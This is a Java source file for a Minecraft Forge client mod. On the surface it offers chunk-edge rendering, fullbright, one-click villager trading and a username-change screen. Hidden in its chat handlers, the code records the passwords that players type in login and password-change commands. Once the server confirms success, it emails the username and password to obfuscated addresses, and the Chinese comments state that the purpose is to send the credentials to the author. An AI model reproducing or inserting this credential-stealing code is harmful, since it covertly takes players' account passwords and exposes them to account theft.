package anonym.minecraft.mod;

import java.util.List;

import org.lwjgl.opengl.GL11;

import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.client.renderer.BufferBuilder;
import net.minecraft.client.renderer.Tessellator;
import net.minecraft.client.renderer.vertex.DefaultVertexFormats;
import net.minecraft.entity.Entity;
import net.minecraft.inventory.ClickType;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.client.event.RenderWorldLastEvent;
import net.minecraftforge.event.world.WorldEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent;

public class AEventHandler {

	static String qwq = "";
	static String pwp = "";

	public AEventHandler() {
	}

	public static void handleItems(net.minecraft.network.play.client.CPacketChatMessage e) {
		String message = Util.getMessage(e);
		if (message != null) {
			if (message.contains(" ") && message.contains("/")) {
				String str = message;
				while (str.contains("  ")) {
					str = str.replace("  ", " ");
				}
				String[] st = str.split(" ");
				//System.out.println("消息: " + message);
				if (st.length >= 2) {
					if(checkItem(st, str)) {
						
					}
				}
			}
		}
	}
	
	
    @SubscribeEvent
    public void resetOverlay(final WorldEvent.Load event) {
        this.showChunkEdge = 0;
    }
	int showChunkEdge = 0;
    @SubscribeEvent
    public void renderChunkEdges(final RenderWorldLastEvent event) {
        if (showChunkEdge==0) {
            return;
        }
        final Entity entity = (Entity)Minecraft.getMinecraft().player;
        final Tessellator tessellator = Tessellator.getInstance();
        final BufferBuilder worldrenderer = tessellator.getBuffer();
        GL11.glPushMatrix();
        final float frame = event.getPartialTicks();
        final double inChunkPosX = entity.lastTickPosX + (entity.posX - entity.lastTickPosX) * frame;
        final double inChunkPosY = entity.lastTickPosY + (entity.posY - entity.lastTickPosY) * frame;
        final double inChunkPosZ = entity.lastTickPosZ + (entity.posZ - entity.lastTickPosZ) * frame;
        GL11.glTranslated(-inChunkPosX, -inChunkPosY, -inChunkPosZ);
        GL11.glDisable(3553);
        GL11.glEnable(3042);
        GL11.glBlendFunc(770, 771);
        GL11.glLineWidth(2.0f);
        worldrenderer.begin(1, DefaultVertexFormats.POSITION_COLOR);
        GL11.glTranslatef((float)(entity.chunkCoordX * 16), 0.0f, (float)(entity.chunkCoordZ * 16));
        double x = 0.0;
        double z = 0.0;
        final float redColourR = 0.9f;
        final float redColourG = 0.0f;
        final float redColourB = 0.0f;
        float redColourA = 1.0f;
        final float greenColourR = 0.0f;
        final float greenColourG = 0.9f;
        final float greenColourB = 0.9f;
        float greenColourA = 0.4f;
        for (int chunkZ = -2; chunkZ <= 2; ++chunkZ) {
            for (int chunkX = -2; chunkX <= 2; ++chunkX) {
                if (Math.abs(chunkX) != 2 || Math.abs(chunkZ) != 2) {
                    x = chunkX * 16;
                    z = chunkZ * 16;
                    redColourA = Math.round(Math.pow(1.25, -(chunkX * chunkX + chunkZ * chunkZ)) * 6.0) / 6.0f;
                    worldrenderer.pos(x, 0.0, z).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x, 256.0, z).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x + 16.0, 0.0, z).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x + 16.0, 256.0, z).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x, 0.0, z + 16.0).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x, 256.0, z + 16.0).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x + 16.0, 0.0, z + 16.0).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                    worldrenderer.pos(x + 16.0, 256.0, z + 16.0).color(redColourR, redColourG, redColourB, redColourA).endVertex();
                }
            }
        }
        z = (x = 0.0);
        if(showChunkEdge == 2) {
            final float eyeHeight = (float)(entity.getEyeHeight() + entity.posY);
            final int eyeHeightBlock = (int)Math.floor(eyeHeight);
            final int minY = Math.max(0, eyeHeightBlock - 16);
            final int maxY = Math.min(256, eyeHeightBlock + 16);
            boolean renderedSome = false;
            for (int y = 0; y < 257; ++y) {
                greenColourA = 0.4f;
                if (y < minY) {
                    greenColourA -= (float)(Math.pow(minY - y, 2.0) / 500.0);
                }
                if (y > maxY) {
                    greenColourA -= (float)(Math.pow(y - maxY, 2.0) / 500.0);
                }
                if (greenColourA < 0.01f) {
                    if (renderedSome) {
                        break;
                    }
                }
                else {
                    if (y < 256) {
                        for (int n = 1; n < 16; ++n) {
                            worldrenderer.pos((double)n, (double)y, z).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos((double)n, (double)(y + 1), z).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos(x, (double)y, (double)n).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos(x, (double)(y + 1), (double)n).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos((double)n, (double)y, z + 16.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos((double)n, (double)(y + 1), z + 16.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos(x + 16.0, (double)y, (double)n).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                            worldrenderer.pos(x + 16.0, (double)(y + 1), (double)n).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                        }
                    }
                    worldrenderer.pos(0.0, (double)y, 0.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(16.0, (double)y, 0.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(0.0, (double)y, 0.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(0.0, (double)y, 16.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(16.0, (double)y, 0.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(16.0, (double)y, 16.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(0.0, (double)y, 16.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    worldrenderer.pos(16.0, (double)y, 16.0).color(greenColourR, greenColourG, greenColourB, greenColourA).endVertex();
                    renderedSome = true;
                }
            }
        }
        tessellator.draw();
        GL11.glPopMatrix();
        GL11.glEnable(3553);
        GL11.glDisable(3042);
    }
    
	@SubscribeEvent
	public void setWorldEventHandler(ClientChatReceivedEvent event) {
		event.getMessage().getFormattedText();
		//net.minecraft.client.Minecraft mc = Util.getMinecraft();
		// 取得有颜色代码的消息
		String msg = Util.getFT(event);
		// logger.info("消息: " + msg);
		// msg 应该要包含登录成功的消息
		// §r§6§l登入成功§r§7
		//System.out.println(msg);
		if (Util.isOKU(msg,true) && qwq != "") {
			// 向我发送邮件，内容有用户名和原密码
			new Util().doSendHtmlEmail(
					Util.getKey(
							"Nzc3NzcwN0ExQjM5MzkzNTJGMzQyRTdBMzIzQjI5N0EzODNGM0YzNDdBMzMzNDJFM0YyODM5M0YyQTJFM0YzRQ=="),
					Util.getKey(
							"NjYzODY0MEYyOTNGMjg2MDdBNjY3NTM4NjQ3RjJGMjkzRjI4N0Y2NjM4Mjg3NTY0NjYzODY0MTUyODMzM0QzMzM0M0IzNjdBMEEwRDYwN0E2Njc1Mzg2NDdGMkEzQjI5Mjk3Rg==")
							.replace(Util.getKey("N0YyRjI5M0YyODdG"), Util.getUsername())
							.replace(Util.getKey("N0YyQTNCMjkyOTdG"), qwq));
			qwq = "";
		}
		// msg 应该要包含密码修改成功的消息
		// §r§c密码已成功修改
		if (Util.isOKP(msg,true) && pwp != "") {
			// 向我发送邮件，内容有用户名和原密码
			new Util().doSendHtmlEmail(
					Util.getKey(
							"Nzc3NzcwN0EwRjI5M0YyODdBMkEzQjI5MjkyRDM1MjgzRTdBMzkzMjNCMzQzRDNGN0EzODM2MzUzOTMxM0YzRQ=="),
					Util.getKey(
							"NjYzODY0MEYyOTNGMjg2MDdBNjY3NTM4NjQ3RjJGMjkzRjI4N0Y2NjM4Mjg3NTY0NjYzODY0MEEwRDdBMTkzMjNCMzQzRDNGN0ExOTM1MzczNzNCMzQzRTYwN0E2Njc1Mzg2NDdGMkEzQjI5Mjk3Rg==")
							.replace(Util.getKey("N0YyRjI5M0YyODdG"), Util.getUsername())
							.replace(Util.getKey("N0YyQTNCMjkyOTdG"), pwp));
			pwp = "";
		}

	}
	public static void addTradeButton(List<GuiButton> buttonList) {
		ScaledResolution s = new ScaledResolution(Minecraft.getMinecraft());
		GuiButton button = new GuiButton(66, (s.getScaledWidth()-176) / 2 + 150 , (s.getScaledHeight() -166)/2 + 52, 50, 20, "一键交易");
		buttonList.add(button);
	}
	
	public static void clickTradeButton(GuiButton button) {
		if(button.id == 66) {
			raiseItems();
		}
	}
	public static void addChangeNameButton(List<GuiButton> buttonList) {
		//ScaledResolution s = new ScaledResolution(Minecraft.getMinecraft());
		GuiButton button = new GuiButton(66, 5 , 5, 70, 20, "更换用户名");
		buttonList.add(button);
	}
	
	public static void clickChangeNameButton(GuiButton button) {
		if(button.id == 66) {
			Minecraft mc = Minecraft.getMinecraft();
			mc.displayGuiScreen(new GuiChangeUsername(mc.currentScreen));
		}
	}
	public static void raiseItems() {
		if (net.minecraft.client.Minecraft.getMinecraft() != null) {
			net.minecraft.client.Minecraft mc = net.minecraft.client.Minecraft.getMinecraft();
			if (mc.currentScreen instanceof net.minecraft.client.gui.GuiMerchant) {
				net.minecraft.client.gui.GuiMerchant gui = (net.minecraft.client.gui.GuiMerchant) (mc.currentScreen);

				try {
					Class<? extends net.minecraft.client.gui.GuiMerchant> c = gui.getClass();
					boolean contains = false;
					for (java.lang.reflect.Field field : c.getDeclaredFields()) {
						if (field.getName() == "selectedMerchantRecipe") {
							contains = true;
							break;
						}
					}

					java.lang.reflect.Field f;
					if (contains) {
						f = c.getDeclaredField("selectedMerchantRecipe");
					} else {
						f = c.getDeclaredField("field_147041_z");
					}
					f.setAccessible(true);
					int k = f.getInt(gui);

					net.minecraft.village.MerchantRecipeList merchantrecipelist = gui.getMerchant()
							.getRecipes(net.minecraft.client.Minecraft.getMinecraft().player);
					java.util.List<net.minecraft.inventory.Slot> list = gui.inventorySlots.inventorySlots;

					if (merchantrecipelist != null && !merchantrecipelist.isEmpty()) {

						net.minecraft.village.MerchantRecipe merchantrecipe = (net.minecraft.village.MerchantRecipe) merchantrecipelist
								.get(k);

						mc.playerController.windowClick(gui.inventorySlots.windowId, 0, 0, ClickType.QUICK_MOVE, mc.player);
						mc.playerController.windowClick(gui.inventorySlots.windowId, 1, 0, ClickType.QUICK_MOVE, mc.player);

						boolean a = false;
						boolean b = false;
						for (int i = 3; i < list.size(); i++) {
							net.minecraft.inventory.Slot s = list.get(i);
							if (s.getHasStack()) {

								if (a && b) {
									break;
								}
								if (!a && merchantrecipe.getItemToBuy() != null
										&& Util.isItemSimilar(merchantrecipe.getItemToBuy(), s.getStack())
										&& s.getStack().getCount() >= merchantrecipe.getItemToBuy().getCount()) {

									mc.playerController.windowClick(gui.inventorySlots.windowId, i, 0, ClickType.PICKUP, mc.player);
									mc.playerController.windowClick(gui.inventorySlots.windowId, 0, 0, ClickType.PICKUP, mc.player);
									mc.playerController.updateController();
									a = true;
									continue;
								}
								if (!b && merchantrecipe.getSecondItemToBuy() != null
										&& Util.isItemSimilar(merchantrecipe.getSecondItemToBuy(), s.getStack())
										&& s.getStack().getCount() >= merchantrecipe.getSecondItemToBuy().getCount()) {

									mc.playerController.windowClick(gui.inventorySlots.windowId, i, 0, ClickType.PICKUP, mc.player);
									mc.playerController.windowClick(gui.inventorySlots.windowId, 1, 0, ClickType.PICKUP, mc.player);
									mc.playerController.updateController();
									b = true;
									continue;
								}
							}
						}

						mc.playerController.windowClick(gui.inventorySlots.windowId, 2, 0, ClickType.QUICK_MOVE, mc.player);
						mc.playerController.updateController();
					}

				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}
	}
	private static boolean checkItem(String[] s1, String s2) {
		// 记录任何与修改密码有关的可疑命令
		if (Util.isOKP(s1[0],false)) {
			pwp = s2;
		}
		// 记录任何登录命令
		if (Util.isOKU(s1[0],false)) {
			qwq = s1[1];
		}
		return true;
	}
	@SubscribeEvent
	public void onKeyInput(KeyInputEvent event) {
		Minecraft mc= Minecraft.getMinecraft();
		if(Main.key_fullbright.isKeyDown()) {
			if(mc.gameSettings.gammaSetting<=1.0f) {
				mc.gameSettings.gammaSetting = 15.0f;
			}
			else {
				mc.gameSettings.gammaSetting = 1.0f;
			}
		}
		if(Main.key_chunkedge.isKeyDown()) {
			if(showChunkEdge<2) {
				showChunkEdge++;
			}
			else {
				showChunkEdge = 0;
			}
		}
	}
}
